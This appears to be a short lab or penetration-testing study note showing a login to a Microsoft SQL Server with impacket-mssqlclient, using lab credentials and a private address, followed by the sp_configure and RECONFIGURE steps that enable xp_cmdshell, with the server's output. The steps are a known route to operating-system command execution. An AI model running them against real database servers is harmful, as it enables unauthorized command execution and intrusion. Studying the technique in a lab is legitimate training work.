### MANUAL CODE EXECUTION

└─$ impacket-mssqlclient Administrator:Lab123@192.168.231.18 -windows-auth

SQL> **EXECUTE sp_configure 'show advanced options', 1;**
INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.  ****
SQL> **RECONFIGURE; - to configure**
SQL> **EXECUTE sp_configure 'xp_cmdshell**', 1; **to open the xp_cmdshell**
 INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> **RECONFIGURE   ----applies all the changes**
SQL> 

